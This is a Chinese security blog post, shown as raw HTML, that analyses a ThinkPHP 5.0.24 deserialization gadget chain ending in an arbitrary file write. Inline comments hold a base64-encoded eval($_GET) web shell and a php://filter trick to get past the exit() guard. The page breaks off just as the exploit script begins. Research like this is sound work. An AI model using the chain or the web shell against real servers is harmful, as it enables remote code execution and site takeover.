<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-Thinkphp5.0.24反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-date">
  	<time datetime="2021-11-02T16:00:00.000Z" itemprop="datePublished">2021-11-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/03/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
        thinkPHP5.0.24反序列化链
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="thinkPHP5-0-24反序列化链"><a href="#thinkPHP5-0-24反序列化链" class="headerlink" title="thinkPHP5.0.24反序列化链"></a>thinkPHP5.0.24反序列化链</h1><p>首先我们先全局搜索__destruct()，然后可以使用think\process\pipes\Windows.php里的__destruct()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;close();</span><br><span class="line">    $this-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看向removeFiles()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private function removeFiles()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($this-&gt;files as $filename) &#123;</span><br><span class="line">        if (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于file_exists()函数的特性，我们可以通过构造$this-&gt;files来触发__toString()魔术方法，因此，我们全局搜索__toString()，发现我们可以利用think\Model.php的__toString()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看向toJson函数，然后再看向toArray函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">public function toArray()</span><br><span class="line"> &#123;</span><br><span class="line">     $item    = [];</span><br><span class="line">     $visible = [];</span><br><span class="line">     $hidden  = [];</span><br><span class="line"></span><br><span class="line">     $data = array_merge($this-&gt;data, $this-&gt;relation);</span><br><span class="line"></span><br><span class="line">     // 过滤属性</span><br><span class="line">     if (!empty($this-&gt;visible)) &#123;</span><br><span class="line">         $array = $this-&gt;parseAttr($this-&gt;visible, $visible);</span><br><span class="line">         $data  = array_intersect_key($data, array_flip($array));</span><br><span class="line">     &#125; elseif (!empty($this-&gt;hidden)) &#123;</span><br><span class="line">         $array = $this-&gt;parseAttr($this-&gt;hidden, $hidden, false);</span><br><span class="line">         $data  = array_diff_key($data, array_flip($array));</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">         if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">             // 关联模型对象</span><br><span class="line">             $item[$key] = $this-&gt;subToArray($val, $visible, $hidden, $key);</span><br><span class="line">         &#125; elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) &#123;</span><br><span class="line">             // 关联模型数据集</span><br><span class="line">             $arr = [];</span><br><span class="line">             foreach ($val as $k =&gt; $value) &#123;</span><br><span class="line">                 $arr[$k] = $this-&gt;subToArray($value, $visible, $hidden, $key);</span><br><span class="line">             &#125;</span><br><span class="line">             $item[$key] = $arr;</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             // 模型属性</span><br><span class="line">             $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     // 追加属性（必须定义获取器）</span><br><span class="line">     if (!empty($this-&gt;append)) &#123;</span><br><span class="line">         foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">             if (is_array($name)) &#123;</span><br><span class="line">                 // 追加关联对象属性</span><br><span class="line">                 $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                 $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">             &#125; elseif (strpos($name, &#x27;.&#x27;)) &#123;</span><br><span class="line">                 list($key, $attr) = explode(&#x27;.&#x27;, $name);</span><br><span class="line">                 // 追加关联对象属性</span><br><span class="line">                 $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                 $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 $relation = Loader::parseName($name, 1, false);</span><br><span class="line">                 if (method_exists($this, $relation)) &#123;</span><br><span class="line">                     $modelRelation = $this-&gt;$relation(); //$this-&gt;error</span><br><span class="line">                     $value         = $this-&gt;getRelationData($modelRelation);</span><br><span class="line"></span><br><span class="line">                     if (method_exists($modelRelation, &#x27;getBindAttr&#x27;)) &#123;</span><br><span class="line">                         $bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line">                         if ($bindAttr) &#123;</span><br><span class="line">                             foreach ($bindAttr as $key =&gt; $attr) &#123;</span><br><span class="line">                                 $key = is_numeric($key) ? $attr : $key;</span><br><span class="line">                                 if (isset($this-&gt;data[$key])) &#123;</span><br><span class="line">                                     throw new Exception(&#x27;bind attr has exists:&#x27; . $key);</span><br><span class="line">                                 &#125; else &#123;</span><br><span class="line">                                     $item[$key] = $value ? $value-&gt;getAttr($attr) : null;</span><br><span class="line">                                 &#125;</span><br><span class="line">                             &#125;</span><br><span class="line">                             continue;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                     $item[$name] = $value;</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     $item[$name] = $this-&gt;getAttr($name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return !empty($item) ? $item : [];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以利用这里触发__call()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">               if (is_array($name)) &#123;</span><br><span class="line">                   // 追加关联对象属性</span><br><span class="line">                   $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                   $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">               &#125; elseif (strpos($name, &#x27;.&#x27;)) &#123;</span><br><span class="line">                   list($key, $attr) = explode(&#x27;.&#x27;, $name);</span><br><span class="line">                   // 追加关联对象属性</span><br><span class="line">                   $relation   = $this-&gt;getAttr($key);</span><br><span class="line">                   $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   $relation = Loader::parseName($name, 1, false);</span><br><span class="line">                   if (method_exists($this, $relation)) &#123;</span><br><span class="line">                       $modelRelation = $this-&gt;$relation();</span><br><span class="line">                       $value         = $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
<p>我们发现$name是可控的，而且搜索这一个类，发现getError()函数可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getError()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而$this-&gt;error也是可控的，而看向Loader::parseName($name, 1, false)，通过解释，发现它只是改变字符串的风格，所以$relation会是$name的值，而这里$modelRelation = $this-&gt;$relation();会调用getError()函数，然后我们再看向getRelationData()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected function getRelationData(Relation $modelRelation)</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123;</span><br><span class="line">        $value = $this-&gt;parent;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 首先获取关联数据</span><br><span class="line">        if (method_exists($modelRelation, &#x27;getRelation&#x27;)) &#123;</span><br><span class="line">            $value = $modelRelation-&gt;getRelation();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new BadMethodCallException(&#x27;method not exists:&#x27; . get_class($modelRelation) . &#x27;-&gt; getRelation&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见我们需要找到有getRelation方法的类，且这个类中的getRelation方法可以触发__call()，因此我们通过全局搜索，可以使用think\model\relation\BelongsTo.php里的getRelation方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function getRelation($subRelation = &#x27;&#x27;, $closure = null)</span><br><span class="line">&#123;</span><br><span class="line">    $foreignKey = $this-&gt;foreignKey;</span><br><span class="line">    if ($closure) &#123;</span><br><span class="line">        call_user_func_array($closure, [ &amp; $this-&gt;query]);</span><br><span class="line">    &#125;</span><br><span class="line">    $relationModel = $this-&gt;query</span><br><span class="line">        -&gt;removeWhereField($this-&gt;localKey)</span><br><span class="line">        -&gt;where($this-&gt;localKey, $this-&gt;parent-&gt;$foreignKey)</span><br><span class="line">        -&gt;relation($subRelation)</span><br><span class="line">        -&gt;find();</span><br><span class="line"></span><br><span class="line">    if ($relationModel) &#123;</span><br><span class="line">        $relationModel-&gt;setParent(clone $this-&gt;parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $relationModel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时因为$this-&gt;query是可控的，所以我们可以构造$this-&gt;query来触发__call，所以我们需要全局搜索__call，发现按我们可以使用think\console\Output.php里的__call()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $args)</span><br><span class="line">&#123;</span><br><span class="line">    if (in_array($method, $this-&gt;styles)) &#123;</span><br><span class="line">        array_unshift($args, $method);</span><br><span class="line">        return call_user_func_array([$this, &#x27;block&#x27;], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;</span><br><span class="line">        return call_user_func_array([$this-&gt;handle, $method], $args);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new Exception(&#x27;method not exists:&#x27; . __CLASS__ . &#x27;-&gt;&#x27; . $method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再看向block()函数，然后再看向writeln()函数，然后再看向write()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时$this-&gt;handle是可控的，所以我们可以全局搜索write，使用think\session\driver\Memcache.php里的write</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function write($sessID, $sessData)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;handler-&gt;set($this-&gt;config[&#x27;session_name&#x27;] . $sessID, $sessData, 0, $this-&gt;config[&#x27;expire&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用think\cache\driver\Memcached.php的set</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public function set($name, $value, $expire = null)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($expire)) &#123;</span><br><span class="line">        $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    if ($expire instanceof \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;tag &amp;&amp; !$this-&gt;has($name)) &#123;</span><br><span class="line">        $first = true;</span><br><span class="line">    &#125;</span><br><span class="line">    $key    = $this-&gt;getCacheKey($name); //PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name</span><br><span class="line">    $expire = 0 == $expire ? 0 : $_SERVER[&#x27;REQUEST_TIME&#x27;] + $expire;</span><br><span class="line">    if ($this-&gt;handler-&gt;set($key, $value, $expire)) &#123; // $this-&gt;handler-&gt;set($key, $value, $expire)为true</span><br><span class="line">        isset($first) &amp;&amp; $this-&gt;setTagItem($key);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们看向赋值给$key的getCacheKry()函数，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;options[&#x27;prefix&#x27;] . $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现$this-&gt;options[‘prefix’]是可控的，然后我们再使用think\cache\driver\File.php的set</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public function set($name, $value, $expire = null) //第二次调用时，$name=tag_.md5(&#x27;123&#x27;),$value=$filename</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($expire)) &#123;</span><br><span class="line">        $expire = $this-&gt;options[&#x27;expire&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    if ($expire instanceof \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $this-&gt;getCacheKey($name, true); //php://filter/convert.base64-decode/resource=./md5(PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name).$name.php</span><br><span class="line">    if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = true;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;</span><br><span class="line">        //数据压缩</span><br><span class="line">        $data = gzcompress($data, 3);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    if ($result) &#123;</span><br><span class="line">        isset($first) &amp;&amp; $this-&gt;setTagItem($filename); </span><br><span class="line">        clearstatcache();</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于进入的数据$data会因为exit();，导致后面的数据无法使用，所以我们可以使用php伪协议的方式进行绕过，我们再次看向File.php的getCacheKey()函数，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">protected function getCacheKey($name, $auto = false)</span><br><span class="line">&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    if ($this-&gt;options[&#x27;cache_subdir&#x27;]) &#123;</span><br><span class="line">        // 使用子目录</span><br><span class="line">        $name = substr($name, 0, 2) . DS . substr($name, 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;options[&#x27;prefix&#x27;]) &#123;</span><br><span class="line">        $name = $this-&gt;options[&#x27;prefix&#x27;] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $this-&gt;options[&#x27;path&#x27;] . $name . &#x27;.php&#x27;; // php://filter/convert.base64-decode/resource=./md5(PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name).$name.php</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    if ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, 0755, true);</span><br><span class="line">    &#125;</span><br><span class="line">    return $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知$this-&gt;option[‘path’]是可控的，所以导入数据的文件名也是可控的，所以我们可以先第一次，导入数据进文件中，致使think\cache\driver\Memcached.php中的$this-&gt;handler-&gt;set($key, $value, $expire)为true，然后致使$key进入到setTagltem中去，而$key是我们可以控制的，所以我们看向setTagltem()函数，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected function setTagItem($name)</span><br><span class="line">&#123;</span><br><span class="line">    if ($this-&gt;tag) &#123;</span><br><span class="line">        $key       = &#x27;tag_&#x27; . md5($this-&gt;tag); //$this-&gt;tag=&#x27;123&#x27;</span><br><span class="line">        $this-&gt;tag = null;</span><br><span class="line">        if ($this-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(&#x27;,&#x27;, $this-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(&#x27;,&#x27;, array_unique($value));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = $name; //PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4+$name</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;set($key, $value, 0); //$value=$filename,$key=tag_.md5(&#x27;123&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们输入的$key会变为$name，然后文件名为 ‘tag_’ . md5($this-&gt;tag)，最后再次进入File.php的set方法中，然后写入文件，按照以上的思路的exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 